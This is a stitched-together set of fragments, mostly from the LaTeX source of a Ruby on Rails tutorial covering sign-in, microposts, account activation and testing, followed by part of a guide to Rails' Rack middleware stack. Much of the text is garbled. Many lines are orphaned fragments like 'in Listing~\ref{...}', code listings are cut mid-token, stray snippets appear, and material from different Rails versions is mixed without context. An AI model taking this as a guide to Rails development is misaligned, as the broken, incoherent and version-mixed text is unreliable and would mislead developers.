Because of the flash message display in the site layout (Listing~\ref{code:layout_flash}), the \kode{flash[:danger]} message automatically gets displayed; because of the Bootstrap CSS, it automatically gets nice styling (Figure~\ref{fig:failed_signin_flash}).
Next, we need a test to capture the sequence shown in Figure~\ref{fig:failed_signin_flash_3rd_edition} and Figure~\ref{fig:flash_persistence_3rd_edition}.
With this substitution, the corrected application code appears as in Listing~\ref{code:correct_signin_failure}.
The result appears in Listing~\ref{code:sign_in_success}
in Listing~\ref{code:sessions_helper_include}.
in Listing~\ref{code:signed_in_p}.
as shown in Listing~\ref{code:layout_signin_signout_links}.
in Listing~\ref{code:layout_signin_signout_links} and
as shown in Listing~\ref{code:signin_upon_signup}.
The result appears in Listing~\ref{code:signin_after_signup_test}
The result is shown in Listing~\ref{code:jquery_file_test}.
It's important to understand that code like that shown in Listing~\ref{code:jquery_file_test} can't actually prevent a user from trying to upload a file that's too big.
The new steps appear in Listing~\ref{code:user_signout_test}.
In Section~\ref{sec:signing_in}, we used the Rails \kode{session} method to store the user's id, but this information disappears when the user closes their browser.
As noted in Section~\ref{sec:a_working_sign_in_method}, information stored using \kode{session} is automatically secure, but this is not the case with information stored using \kode{cookies}.
The result appears in Listing~\ref{code:image_uploader_resizing}
Before proceeding, be sure to commit and merge your changes if you're using Git for version control:
You can also push the app up to Heroku at this point.
The status feed partial defers the feed item rendering to a feed item partial using the code
Here we pass a \kode{:collection} parameter with the feed items, which causes \kode{render} to use the given partial (\kode{'feed\_item'} in this case) to render each item in the collection.
(We have omitted the \kode{:partial} parameter in previous renderings, writing, e.g., \kode{render 'shared/micropost'}, but with a \kode{:collection} parameter that syntax doesn't work.)
in Listing~\ref{code:feed_item_partial}.
A partial for a single feed item.
As with sessions (Section~\ref{sec:sessions_and_failed_signin}), we'll model account activations as a resource even though they won't be associated with an Active Record model.
in Listing~\ref{code:preventing_unactivated_signins}.
Listing~\ref{code:signup_with_account_activation_test} also uses the \kode{assigns} method for the first time in the main tutorial; as explained in the Chapter~\ref{cha:sign_in_sign_out} exercise (Section~\ref{sec:sign_in_out_exercises}), \kode{assigns} lets us access instance variables in the corresponding action.
in Listing~\ref{code:test_helper_sign_in}.
as seen in Listing~\ref{code:sign_in_password_resets} and Figure~\ref{fig:forgot_password_link}.
The new password resets form has a lot in common with Listing~\ref{code:signin_form_redux}; the most important differences are the use of a different resource and URL in the call to \kode{form\_for} and the omission of the password attribute.
in Listing~\ref{code:user_relationships_association}.
The result appears in Listing~\ref{code:relationship_belongs_to}
\href{http://www.railstutorial.org/screencasts}{The \emph{Ruby on Rails Tutorial} screencasts}: I have prepared a full-length screencast course based on this book.
\href{http://peepcode.com/}{PeepCode} and \href{http://mbsy.co/6VQ8l}{Code School}: The screencasts at PeepCode and interactive courses at Code School are consistently high-quality, and I warmly recommend them.
This optional section describes the testing setup used in the \href{http://www.railstutorial.org/}{Ruby on Rails Tutorial screencast series}.
as shown in Listing~\ref{code:sessions_helper_authenticate}.
Moving the \kode{signed\_in\_user} method into the Sessions helper.
To avoid code repetition, you should also remove \kode{signed\_in\_user} from the Users controller at this time.
If we were to add, say, an \kode{index} action accessible even to non-signed-in users, we would need to specify the protected actions explicitly:
Since a micropost creation form only makes sense in the context of a particular signed-in user, one goal of this section will be to serve different versions of the Home page depending on a visitor's signin status.
from Listing~\ref{code:errors_partial} to
as shown in Listing~\ref{code:add_micropost_different_owner}.
The \kode{update} action needed to get the tests in Listing~\ref{code:successful_edit_test} to pass is similar to the final form of the \kode{create} action (Listing~\ref{code:signin_upon_signup}), as seen in Listing~\ref{code:user_update_action}.
To implement the forwarding behavior shown in Figure~\ref{fig:signin_page_protected_mockup_bootstrap}, we'll use a \emph{before filter} in the Users controller.
in Listing~\ref{code:user_signout_test}.
from Listing~\ref{code:test_helper_sign_in} to
as shown in Listing~\ref{code:edit_tests_signed_in}.
in Listing~\ref{code:edit_tests_signed_in}.
The resulting data model appears in Figure~\ref{fig:user_model_admin_3rd_edition}.
As in Section~\ref{sec:requiring_signed_in_users} and Section~\ref{sec:requiring_the_right_user}, we'll enforce access control using a before filter, this time to restrict access to the \kode{destroy} action to admins.
Following the practice from Section~\ref{sec:requiring_signed_in_users}, we'll put action-level tests of access control in the Users controller test file.
The \kode{belongs\_to} relationship between a micropost and its user.
This automatically ensures that we find only microposts belonging to the current user.
in Listing~\ref{code:signin_form_html}.
as shown in Listing~\ref{code:user_signin_test_valid_information}.
as shown in Listing~\ref{code:sign_in_with_remember}.
as shown in Listing~\ref{code:sign_out_with_forget}.
in Listing~\ref{code:remember_me_checkbox}.
in Listing~\ref{code:signin_create_user_instance} and
in Listing~\ref{code:activation_token_test}.
The result appears in Listing~\ref{code:user_model_activation_code}
as seen in Listing~\ref{code:user_fixture_reset_token}.
The resulting augmented data model for microposts appears in Figure~\ref{fig:micropost_model_image}.
in Listing~\ref{code:add_remember_token_to_users}.
For more details on the kind of callbacks supported by Active Record, see the \href{http://guides.rubyonrails.org/active_record_callbacks.html}{discussion of callbacks at the Rails Guides}.
in Listing~\ref{code:sign_in_function}.
in Listing~\ref{code:generated_user_fixtures}.
in Listing~\ref{code:user_signin_test_valid_information}.
as shown in Listing~\ref{code:test_helper_sign_in}.
as seen in Listing~\ref{code:cookie_sign_in}.
With the code in this section, our Micropost model and interface are complete, and the test suite should pass:
Because the data model has changed through the addition of the \kode{microposts} table, you will also need to migrate the production database:
We've covered enough material now that there is a combinatorial explosion of possible extensions to the application.
Below are just a few of the many possibilities.
The result appears in Listing~\ref{code:remember_digest_should_not_be_blank}
<n>  x    =   x   +   1
delete<n>      user
 We first saw microposts in larval form in Chapter~\ref{cha:a_demo_app}, and in this chapter we will make a full-strength version of the sketch from Section~\ref{sec:microposts_resource} by constructing the Micropost data model, associating it with the User model using the \kode{has\_many} and \kode{belongs\_to} methods, and then making the forms and partials needed to manipulate and display the results (including, in Section~\ref{sec:micropost_images}, uploaded images).
If you're using Git for version control, I suggest making a topic branch as usual:
as shown in Listing~\ref{code:initial_micropost_spec}.
The initial Micropost spec.
We can get these tests to pass by running the microposts migration and preparing the test database:
You should verify that the tests pass:
Even though the tests are passing, you might have noticed this code:
The comment indicates that the code in the \kode{before} block is not idiomatically correct.
That is, it works, but it's not the Rails way.
See if you can guess why.
Since this will involve a minor refactoring, in this section we'll write a test to catch any future regressions.
This code requires that the micropost be valid and tests for the presence of the \kode{user\_id} attribute.
Now we're prepared to see why
is wrong.
The problem is that by default (as of Rails~3.2.3) \emph{all} of the attributes for our Micropost model are accessible.
For example, a malicious user could change the \kode{user\_id} attributes on microposts, thereby associating microposts with the wrong users.
This means that we should remove \kode{:user\_id} from the \kode{attr\_accessible} list, and once we do, the code above will fail.
Return the User object associated with the micropost.
Return an array of the user's microposts.
Create a micropost (\kode{user\_id = user.id}).
Create a micropost (exception on failure).
Return a new Micropost object (\kode{user\_id = user.id}).
This pattern is the canonical way to make a micropost: \emph{through} its association with a user.
When a new micropost is made in this way, its \kode{user\_id} is \emph{automatically} set to the right value.
Building the micropost through the User association doesn't fix the security problem of having an accessible \kode{user\_id}, and
as shown in Listing~\ref{code:attr_accessible_user_id_test}.
A test to ensure that the \kode{user\_id} isn't accessible.
This test verifies that calling \kode{Micropost.new} with a nonempty \kode{user\_id} raises a mass assignment security error exception.
as shown in Listing~\ref{code:application_whitelist}.
Ensuring that Rails throws errors on invalid mass assignment.
as shown in Listing~\ref{code:micropost_accessible_attribute}.
Making the \kode{content} attribute (and \emph{only} the \kode{content} attribute) accessible.
We can test this with the \kode{it} and \kode{its} methods as follows:
in Listing~\ref{code:micropost_belongs_to_user_spec}.
Tests for the micropost's user association.
A test for the user's \kode{microposts} attribute.
in Listing~\ref{code:micropost_belongs_to_user_spec} and
You should also check that the tests pass:
In this section, we'll add \emph{ordering} and \emph{dependency} to microposts, while also testing that the \kode{user.microposts} method actually returns an array of microposts.
We will need to construct some microposts in the User model test, which means that we should make a micropost factory at this point.
To do this, we need a way to make an association in Factory Girl.
as seen in Listing~\ref{code:micropost_factory}.
The complete factory file, including a new factory for microposts.
Here we tell Factory Girl about the micropost's associated user just by including a user in the definition of the factory:
As we'll see in the next section, this allows us to define factory microposts as follows:
To test this ordering, we first create a couple of microposts as follows:
Note how convenient the use of Factory Girl is: we can set \kode{created\_at} manually, which Active Record won't allow us to do.
(Recall that \kode{created\_at} and \kode{updated\_at} are ``magic'' columns, automatically set to the proper creation and update timestamps, so any explicit initialization values are overwritten by the magic.)
in Listing~\ref{code:micropost_ordering_test}.
This uses the \kode{let!} (read ``let bang'') method in place of \kode{let}; the reason is that \kode{let} variables are \emph{lazy}, meaning that they only spring into existence when referenced.
The problem is that we want the microposts to exist immediately, so that the timestamps are in the right order and so that \kode{@user.microposts} isn't empty. We accomplish this with \kode{let!}, which forces the corresponding variable to come into existence immediately.
Testing the order of a user's microposts.
The key line here is
indicating that the posts should be ordered newest first.
This should fail because by default the posts will be ordered by~id, i.e., \kode{[older\_micropost, newer\_micropost]}.
as shown in Listing~\ref{code:micropost_ordering}.
Ordering the microposts with \kode{default\_scope}.  
The order here is \kode{'created\_at DESC'}, where \kode{DESC} is SQL for ``descending'', i.e., in descending order from newest to oldest.
As of Rails~4.0, all scopes take an anonymous function that returns the criteria desired for the scope, mainly so that the scope need not be evaluated immediately, but rather can be loaded later on an as-needed basis (so-called \emph{lazy evaluation}).
The syntax for this kind of object, called a \emph{Proc} (procedure) or \emph{lambda}, is the arrow~\kode{->}.
(Procs are a somewhat advanced Ruby topic, so don't worry if they don't make sense right away.)
Recall from Section~\ref{sec:destroying_users} that site administrators have the power to \emph{destroy} users.
We can test for this by first destroying a micropost's user and then verifying that the associated microposts are no longer in the database.
In order to test destroying microposts properly, we first need to capture a given user's posts in a local variable, and then destroy the user.
A straighforward implementation looks like this:
# Make sure the micropost doesn't appear in the database.
Unfortunately, this doesn't work, due to a subtlety about Ruby arrays.
Array assignment in Ruby copies a \emph{reference} to the array, not the full array itself, which means that changes to the original array also affect the copy.
For example, suppose we create an array, assign a second variable to it, and then reverse the first array in place using the \kode{reverse!}
Somewhat suprisingly, here \kode{b} gets reversed as well as \kode{a}.
This is because both \kode{a} and \kode{b} point to the same array.
(The same thing happens with other Ruby data structures, such as strings and hashes.)
In the case of a user's microposts, we would have this:
(Because we haven't implemented the destruction of associated microposts yet, this code won't currently work, and is included only to illustrate the principle.)
Here we see that destroying a user leaves the \kode{microposts} variable with no elements; i.e., it's the empty array~\kode{[]}.
This behavior means that we must take great care when making duplicates of Ruby objects.
To duplicate relatively simple objects such as arrays, we can use the \kode{dup} method:
(This is known as a ``shallow copy''.
Making a ``deep copy'' is a much more difficult problem, and in fact has no general solution, but dropping ``ruby deep copy'' into a search engine should be enough to get you started if you need to copy a more complicated structure such as a nested array.)
Applying the \kode{dup} method to the user's microposts gives us code like this:
Here the call to \kode{to\_a} effectively makes a copy of the microposts, and we've included the line
as a safety check to catch any errors should the \kode{to\_a} ever be accidentally removed.
The issue is that, without \kode{to\_a}, destroying the user would destroy the posts in the \kode{microposts} variable, and as a result
wouldn't actually test anything because \kode{microposts} would be empty.
We can express the expectation that the microposts don't appear in the database as follows:
Here we have used \kode{Micropost.where} instead of \kode{Micropost.find} because it returns an empty object if the record is not found instead of raising an exception, which is a little easier to test. (
In case you're curious, the code
does the trick in this case.)
Testing that microposts are destroyed when users are.
as shown in Listing~\ref{code:micropost_dependency}.
With that, the final form of the user/micropost association is in place, and all the tests should be passing:
Like the \kode{user\_id}, the \kode{content} attribute must be present, and it is further constrained to be no longer than 140 characters, making it an honest \emph{micro}post.
The application code is a one-liner:
in Listing~\ref{code:micropost_validations}.
We begin with tests for displaying the user's microposts, which we'll create in the request spec for Users.
Our strategy is to create a couple of factory microposts associated with the user, and then verify that the show page contains each post's content.
To accomplish this, we use the \kode{let!} variant:
in Listing~\ref{code:user_show_microposts_test}.
A test for showing microposts on the user \kode{show} page.
Note here that we can use the \kode{count} method \emph{through} the association:
The association \kode{count} method is smart, and performs the count directly in the database.
In particular, it does \emph{not} pull all the microposts out of the database and then call \kode{length} on the resulting array, as this could become inefficient as the number of microposts grew.
as shown in Listing~\ref{code:user_show_microposts}.
<aside>
We'll deal with the microposts list momentarily, but there are several other things to note first.
In the present case, since we are still in the Users controller but want to paginate \emph{microposts} instead, we pass an explicit \kode{@microposts} variable to \kode{will\_paginate}.
Finally, note that we have taken this opportunity to add a count of the current number of microposts:
As noted, \kode{@user.microposts.count} is the analogue of the \kode{User.count} method, except that it counts the microposts belonging to a given user through the user/micropost association.
We come finally to the micropost list itself:
This code, which uses the \emph{ordered list} tag~\kode{ol}, is responsible for generating the list of microposts, but you can see that it just defers the heavy lifting to a micropost partial.
Similarly, the code
does exactly the same thing for microposts.
as shown in Listing~\ref{code:micropost_partial}.
We then make 50 microposts for each user (plenty to overflow the pagination limit of~30), generating sample content for each micropost using the Faker gem's handy \href{http://rubydoc.info/gems/faker/1.3.0/Faker/Lorem}{\texttt{Lorem.sentence} method}.
Of course, to generate the new sample data we have to run the \kode{db:populate} Rake task:
Finally, Figure~\ref{fig:user_profile_microposts_page_2_rails_3} shows the \emph{second} page of microposts for the first user, along with the pagination links at the bottom of the display.
There is one break with past convention worth noting: the interface to the Microposts resource will run principally through the Users and StaticPages controllers, so we won't need actions like \kode{new} or \kode{edit} in the Microposts controller; we'll only need \kode{create} and \kode{destroy}.
as seen in Listing~\ref{code:microposts_resource}.
\href{http://www.michaelhartl.com/}{Michael Hartl} is the author of the \href{http://www.railstutorial.org/}{\emph{Ruby on Rails Tutorial}}, the leading introduction to web development with \href{http://rubyonrails.org/}{Ruby on Rails}.
The idea is simple: both the \kode{create} and \kode{destroy} actions should require users to be signed in.
in Listing~\ref{code:micropost_access_control}.
Access control tests for microposts.
In this case, a non-signed-in user is redirected upon submitting a \texttt{POST} request to /microposts (\kode{post microposts\_path}, which hits the \kode{create} action) or submitting a \texttt{DELETE} request to /microposts/1 (\kode{delete micropost\_path(micropost)}, which hits the \kode{destroy} action).
Writing the application code needed to get the tests in Listing~\ref{code:micropost_access_control} to pass requires a little refactoring first.
(Since we didn't generate it at the command line, you will have to create the Microposts controller file by hand.)
Adding authentication to the Microposts controller actions.
in Listing~\ref{code:microposts_create_tests}.
Tests for creating microposts.
in Listing~\ref{code:user_info}<n>and
in Listing~\ref{code:micropost_form}.
in Listing~\ref{code:gravatar_option}.
In the present case, though, saying ``1 microposts'' is ungrammatical, so we arrange to display ``1 micropost'' (but ``2 microposts'') using \kode{pluralize}.
We should define an error messages partial that works regardless of the kind of object passed to it.
Happily, the form variable~\kode{f} can access the associated object through \kode{f.object}, so that in
Unfortunately, the User request spec is now broken because the signup and edit forms use the old version of the error messages partial.
in Listing~\ref{code:signup_errors_updated} and
At this point, all the tests should be passing:
Since each user should have a feed, we are led naturally to a \kode{feed} method in the User model.
Eventually, we will test that the feed returns the microposts of the users being followed, but for now we'll just test that the \kode{feed} method \emph{includes} the current user's microposts but \emph{excludes} the posts of a different user.
Tests for the (proto-)status feed.
These tests introduce (via the RSpec boolean convention) the array \kode{include?}\ method, which simply checks if an array includes the given element
Learning about methods such as \kode{include?}
as shown in Listing~\ref{code:proto_status_feed}.
A test for rendering the feed on the Home page.
will generate a match for each item.
in Listing~\ref{code:home_page_feed_test}.
At this point, the proto-feed should be working, and the test suite should pass:
Tests for the Microposts controller \kode{destroy} action.
as seen in Listing~\ref{code:user_fixture_password_reset_token}.
(The call to \kode{to\_s} is to make sure we can handle \kode{nil} tokens, which shouldn't happen in browsers but sometimes happens in tests.)
The way to do this is with a \href{http://en.wikipedia.org/wiki/Callback_(computer_science)}{\emph{callback}}, which is a method that gets invoked at a particular point in the lifetime of an Active Record object (see the \href{http://api.rubyonrails.org/v4.1.4/classes/ActiveRecord/Callbacks.html}{Rails API entry on callbacks}).
The About page at  \href{http://0.0.0.0:3000/about}{/about}.
By the way, previous versions of Rails used \texttt{PUT} in place of \texttt{PATCH}, and Rails~4.0 still supports this usage, but \texttt{PATCH} \href{http://weblog.rubyonrails.org/2012/2/26/edge-rails-patch-is-the-new-primary-http-method-for-updates/}{matches the intended HTTP usage better} and is preferred for new applications.
If these steps seem mysterious, take heart: I'm just following the instructions from the \href{https://github.com/twbs/bootstrap-sass}{bootstrap-sass README file}.
We then make 50 microposts for each user (plenty to overflow the pagination limit of~30), generating sample content for each micropost using the Faker gem's handy \href{http://faker.rubyforge.org/rdoc/classes/Faker/Lorem.html}{\texttt{Lorem.sentence} method}.
To make some actual microposts, we enter information at the new microposts page, \href{http://0.0.0.0:3000/microposts/new}{/microposts/new}, as seen in Figure~\ref{fig:demo_new_micropost_rails_3}.
The default Rails page served by \texttt{rails server}.
We'll see in just a moment the benefits of adding \kode{has\_secure\_password} to the User model (Section~\ref{sec:creating_a_user}), but first we'll add a minimal requirement on password security.
in Listing~\ref{code:failing_validates_name_test}.
If you've followed the steps in Section~\ref{sec:repository_host}, you might notice that Bitbucket didn't automatically detect the \kode{README.rdoc} file from our repository, instead complaining on the main repository page that there is no README present (Figure~\ref{fig:bitbucket_no_readme}).
(You might also consider the \href{http://www.codeschool.com/courses/testing-with-rspec}{RSpec course at Code School}, which one reader has said answered a lot of his RSpec questions.)
To install and include the new gems, we run \kode{bundle update} and \kode{bundle install}:
This is a ``remembered option'', which means that we don't have to include it in future invocations of Bundler.
A mockup of a profile page with microposts.~\href{http://railstutorial.org/images/figures/user_microposts_mockup_bootstrap-full.png}{(full size)}
The user profile page with code for microposts---but no microposts.~\href{http://railstutorial.org/images/figures/user_profile_no_microposts_bootstrap-full.png}{(full size)}
The user profile (\href{http://localhost:3000/users/1}{/users/1}) with unstyled microposts.~\href{http://railstutorial.org/images/figures/user_profile_microposts_no_styling_bootstrap-full.png}{(full size)}
The user profile (\href{http://localhost:3000/users/1}{/users/1}) with microposts.~\href{http://railstutorial.org/images/figures/user_profile_with_microposts_bootstrap-full.png}{(full size)}
The profile of a different user, also with microposts (\href{http://localhost:3000/users/5}{/users/5}).~\href{http://railstutorial.org/images/figures/other_profile_with_microposts_bootstrap-full.png}{(full size)}
A mockup of the Home page with a form for creating microposts.~\href{http://railstutorial.org/images/figures/home_page_with_micropost_form_mockup_bootstrap-full.png}{(full size)}
The Home page (\href{http://localhost:3000/}{/}) with a new micropost form.~\href{http://railstutorial.org/images/figures/home_with_form_bootstrap-full.png}{(full size)}
The home page with form errors.~\href{http://railstutorial.org/images/figures/home_form_errors_bootstrap-full.png}{(full size)}
A mockup of the Home page with a proto-feed.~\href{http://railstutorial.org/images/figures/proto_feed_mockup_bootstrap-full.png}{(full size)}
The Home page (\href{http://localhost:3000/}{/}) with a proto-feed.~\href{http://railstutorial.org/images/figures/home_with_proto_feed-full.png}{(full size)}
The Home page after creating a new micropost.~\href{http://railstutorial.org/images/figures/micropost_created_bootstrap-full.png}{(full size)}
A mockup of the proto-feed with micropost delete links.~\href{http://railstutorial.org/images/figures/micropost_delete_links_mockup_bootstrap-full.png}{(full size)}
The user home page after deleting the second-most-recent micropost.~\href{http://railstutorial.org/images/figures/home_post_delete_bootstrap-full.png}{(full size)}
The (broken) site layout with a particularly long word.~\href{http://railstutorial.org/images/figures/long_word_micropost_bootstrap-full.png}{(full size)}
The first critical step is to create a \emph{data model} for users of our site, together with a way to store that data.
A valid email regex that disallows double dots in email addressed.
Contents of the sample app's \kode{config} directory.~\href{http://railstutorial.org/images/figures/config_directory_rails_4-full.png}{(full size)}
The raw home view (\href{http://localhost:3000/static_pages/home}{/static\_pages/home}).~\href{http://railstutorial.org/images/figures/raw_home_view_31-full.png}{(full size)}
A red (failing) test.~\href{http://railstutorial.org/images/figures/red_failing_spec_4_0-full.png}{(full size)}
A green (passing) test.~\href{http://railstutorial.org/images/figures/green_passing_spec_4_0-full.png}{(full size)}
The new About page (\href{http://localhost:3000/static_pages/about}{/static\_pages/about}).~\href{http://railstutorial.org/images/figures/about_us_2nd_edition-full.png}{(full size)}
As a result, WEBrick \href{https://devcenter.heroku.com/articles/ruby-default-web-server}{isn't suitable for production use}, so we'll \href{https://devcenter.heroku.com/articles/rails-Puma}{replace WEBrick with Puma}, an HTTP server that is capable of handling a large number of incoming requests.
To add the new webserver, we simply follow the \href{https://devcenter.heroku.com/articles/rails-Puma}{Heroku Puma documentation}.
\href{http://online.pragmaticstudio.com/}{Pragmatic Studio}: Online Ruby and Rails courses from Mike and Nicole Clark.
See the \href{http://api.rubyonrails.org/v4.2.0.rc2/classes/ActiveRecord/Callbacks.html}{Rails API entry on callbacks} for more information on which callbacks Rails supports.
The second half of the association, \kode{has\_many :microposts}, needs to be added by hand, as shown in (Listing~\ref{code:user_has_many_microposts}).
in Listing~\ref{code:log_out_method}.
   Loading development environment
   >> Rails.env
   => "development"
   >> Rails.env.development?
   => true
   >> Rails.env.test?
   => false
   $ rails console test
   Loading test environment
   => "test"
   $ rails server --environment production
   $ bundle exec rake db:migrate RAILS_ENV=production
   $ heroku run console
   Ruby console for yourapp.herokuapp.com
   => "production"
   >> Rails.env.production?
In the next chapter, we'll build on the foundation from Chapter~\ref{cha:beginners} to make a database-backed \emph{toy app}, which will give us our first real taste of what Rails can do.
See the \href{http://api.rubyonrails.org/v4.2.0.rc1/classes/ActiveRecord/Callbacks.html}{Rails API entry on callbacks} for more information on which callbacks Rails supports.
n{Using keyword arguments in the \kode{gravatar\_for} helper. \\ \filepath{app/helpers/users\_helper.rb}}<n>%= lang:ruby, options: "hl_lines": [4]<n>\begin{code}<n>module UsersHelper<n><n>  # Returns the Gravatar for the given user.<n>  def gravatar_for(user, size: 80)<n>    gravatar_id = Digest::MD5::hexdigest(user.email.downcase)<n>    gravatar_url = "https://secure.gravatar.com/avatar/#{gravatar_id}?s=#{size}"<n>    image_tag(gravatar_url, alt: user.name, class: "gravatar")<n>  end<n>end<n>\end{code}<n>\end{codelisting}<n><n>    % subsection a_gravatar_image (end)<n><n>  \section{Signup form} % (fold)<n>  \label{sec:signup_form}<n><n>
ise' id='ex-ad9fd0'></span><n><n>\end{enumerate}<n><n><n>    % subsection signup_error_messages (end)<n><n><n>    \subsection{A test for invalid submission} % (fold)<n>    \label{sec:a_test_for_invalid_submission}<n><n>
 %><n><n>      <%= f.label :password %><n>      <%= f.password_field :password, class: 'form-control' %><n><n>      <%= f.label :password_confirmation, "Confirmation" %><n>      <%= f.password_field :password_confirmation, class: 'form-control' %><n><n>      <%= f.submit "Create my account", class: "btn btn-primary" %><n>    <% end %><n>  </div><n></div><n>\end{code}<n>\end{codelisting}<n><n>    % subsection a_test_for_invalid_submission (end)<n><n>  % section unsuccessful_signups (end)<n><n>  \section{Successful signups} % (fold)<n>  \label{sec:successful_signups}<n><n>
end{enumerate}<n><n>    % subsection the_flash (end)<n><n>    \subsection{The first signup} % (fold)<n>    \label{sec:the_first_signup}<n><n>
nd %><n>      .<n>      .<n>      .<n></html><n>\end{code}<n>\end{codelisting}<n><n>% subsection a_test_for_valid_submission (end)<n><n>  \section{Professional-grade deployment} % (fold)<n>  \label{sec:professional_grade_deployment}<n><n>
grade_deployment (end)<n><n>  \section{Conclusion} % (fold)<n>  \label{sec:sign_up_conclusion}<n><n>Being able to sign up users is a major milestone for our application.
\noindent \emph{Learn Enough Command Line to Be Dangerous} is an introduction to the command line for complete beginners, the first in a \href{http://learnenough.com/}{series of tutorials} designed to teach the common foundations of ``computer magic'' (Box~\ref{aside:computer_magic}) to as broad an audience as possible.
It is aimed both at those who work with software developers and those who aspire to become developers themselves.
Unlike most introductions to the command line, which typically assume a relatively high level of technical sophistication, \emph{Learn Enough Command Line to Be Dangerous} assumes no prerequisites other than general computer knowledge (how to launch an application, how to use a web browser, how to \href{http://lmgtfy.com/?q=learn+to+touch+type}{touch type}, etc.).
Rails on Rack
=============
This guide covers Rails integration with Rack and interfacing with other Rack components.
* How to use Rack Middlewares in your Rails applications.
* Action Pack's internal Middleware stack.
* How to define a custom Middleware stack.
WARNING: This guide assumes a working knowledge of Rack protocol and Rack concepts such as middlewares, url maps and `Rack::Builder`.
Introduction to Rack
Rack provides a minimal, modular and adaptable interface for developing web applications in Ruby. 
By wrapping HTTP requests and responses in the simplest way possible, it unifies and distills the API for web servers, web frameworks, and software in between (the so-called middleware) into a single method call.
* [Rack API Documentation](http://rack.github.io/)
Explaining Rack is not really in the scope of this guide. 
In case you are not familiar with Rack's basics, you should check out the [Resources](#resources) section below.
Rails on Rack
### Rails Application's Rack Object
`Rails.application` is the primary Rack application object of a Rails<n>application. 
Any Rack compliant web server should be using<n>`Rails.application` object to serve a Rails application.
### `rails server`
`rails server` does the basic job of creating a `Rack::Server` object and starting the webserver.
Here's how `rails server` creates an instance of `Rack::Server`
Rails::Server.new.tap do |server|
  require APP_PATH
  Dir.chdir(Rails.application.root)
  server.start
The `Rails::Server` inherits from `Rack::Server` and calls the `Rack::Server#start` method this way:
class Server < ::Rack::Server
  def start
    super
Here's how it loads the middlewares:
def middleware
  middlewares = []
  middlewares << [Rails::Rack::Debugger] if options[:debugger]
  middlewares << [::Rack::ContentLength]
  Hash.new(middlewares)
`Rails::Rack::Debugger` is primarily useful only in the development environment. 
The following table explains the usage of the loaded middlewares:
| Middleware              | Purpose                                                                           |
| ----------------------- | --------------------------------------------------------------------------------- |
| `Rails::Rack::Debugger` | Starts Debugger                                                                   |
To use `rackup` instead of Rails' `rails server`, you can put the following inside `config.ru` of your Rails application's root directory:
# Rails.root/config.ru
require ::File.expand_path('../config/environment', __FILE__)
use Rack::ContentLength
run Rails.application
And start the server:
$ rackup config.ru
To find out more about different `rackup` options:
$ rackup --help
Action Dispatcher Middleware Stack
Many of Action Dispatcher's internal components are implemented as Rack middlewares. 
`Rails::Application` uses `ActionDispatch::MiddlewareStack` to combine various internal and external middlewares to form a complete Rails Rack application.
NOTE: `ActionDispatch::MiddlewareStack` is Rails equivalent of `Rack::Builder`, but built for better flexibility and more features to meet Rails' requirements.
### Inspecting Middleware Stack
Rails has a handy rake task for inspecting the middleware stack in use:
For a freshly generated Rails application, this might produce something like:
use Rack::Sendfile
use ActionDispatch::Static
use Rack::Lock
use #<ActiveSupport::Cache::Strategy::LocalCache::Middleware:0x000000029a0838>
use Rack::Runtime
use Rack::MethodOverride
use ActionDispatch::RequestId
use Rails::Rack::Logger
use ActionDispatch::ShowExceptions
use ActionDispatch::DebugExceptions
use ActionDispatch::RemoteIp
use ActionDispatch::Reloader
use ActionDispatch::Callbacks
use ActiveRecord::Migration::CheckPending
use ActiveRecord::ConnectionAdapters::ConnectionManagement
use ActiveRecord::QueryCache
use ActionDispatch::Cookies
use ActionDispatch::Session::CookieStore
use ActionDispatch::Flash
use ActionDispatch::ParamsParser
use Rack::Head
use Rack::ConditionalGet
use Rack::ETag
run Rails.application.routes
The default middlewares shown here (and some others) are each summarized in the [Internal Middlewares](#internal-middleware-stack) section, below.
### Configuring Middleware Stack
Rails provides a simple configuration interface `config.middleware` for adding, removing and modifying the middlewares in the middleware stack via `application.rb` or the environment specific configuration file `environments/<environment>.rb`.
#### Adding a Middleware
You can add a new middleware to the middleware stack using any of the following methods:
* `config.middleware.use(new_middleware, args)` - Adds the new middleware at the bottom of the middleware stack.
* `config.middleware.insert_before(existing_middleware, new_middleware, args)` - Adds the new middleware before the specified existing middleware in the middleware stack.
* `config.middleware.insert_after(existing_middleware, new_middleware, args)` - Adds the new middleware after the specified existing middleware in the middleware stack.
# Push Rack::BounceFavicon at the bottom
config.middleware.use Rack::BounceFavicon
# Pass { page_cache: false } argument to Lifo::Cache.
config.middleware.insert_after ActiveRecord::QueryCache, Lifo::Cache, page_cache: false
#### Swapping a Middleware
You can swap an existing middleware in the middleware stack using `config.middleware.swap`.
# Replace ActionDispatch::ShowExceptions with Lifo::ShowExceptions
config.middleware.swap ActionDispatch::ShowExceptions, Lifo::ShowExceptions
#### Deleting a Middleware
Add the following lines to your application configuration:
config.middleware.delete "Rack::Lock"
And now if you inspect the middleware stack, you'll find that `Rack::Lock` is<n>not a part of it.
(in /Users/lifo/Rails/blog)
use #<ActiveSupport::Cache::Strategy::LocalCache::Middleware:0x00000001c304c8>
If you want to remove session related middleware, do the following:
config.middleware.delete "ActionDispatch::Cookies"
config.middleware.delete "ActionDispatch::Session::CookieStore"
config.middleware.delete "ActionDispatch::Flash"
And to remove browser related middleware,
### Internal Middleware Stack
Much of Action Controller's functionality is implemented as Middlewares. 
The following list explains the purpose of each of them:
* Sets server specific X-Sendfile header. 
Configure this via `config.action_dispatch.x_sendfile_header` option.
**`ActionDispatch::Static`**
* Sets `env["rack.multithread"]` flag to `false` and wraps the application within a Mutex.
**`ActiveSupport::Cache::Strategy::LocalCache::Middleware`**
* Used for memory caching. 
This cache is not thread safe.
**`Rack::Runtime`**
* Sets an X-Runtime header, containing the time (in seconds) taken to execute the request.
**`Rack::MethodOverride`**
* Allows the method to be overridden if `params[:_method]` is set. 
This is the middleware which supports the PUT and DELETE HTTP method types.
**`ActionDispatch::RequestId`**
* Makes a unique `X-Request-Id` header available to the response and enables the `ActionDispatch::Request#uuid` method.
**`Rails::Rack::Logger`**
* Notifies the logs that the request has began. 
**`ActionDispatch::ShowExceptions`**
* Rescues any exception returned by the application and calls an exceptions app that will wrap it in a format for the end user.
**`ActionDispatch::DebugExceptions`**
* Responsible for logging exceptions and showing a debugging page in case the request is local.
**`ActionDispatch::RemoteIp`**
* Checks for IP spoofing attacks.
**`ActionDispatch::Reloader`**
* Provides prepare and cleanup callbacks, intended to assist with code reloading during development.
**`ActionDispatch::Callbacks`**
**`ActiveRecord::Migration::CheckPending`**
* Checks pending migrations and raises `ActiveRecord::PendingMigrationError` if any migrations are pending.
**`ActiveRecord::ConnectionAdapters::ConnectionManagement`**
* Cleans active connections after each request, unless the `rack.test` key in the request environment is set to `true`.
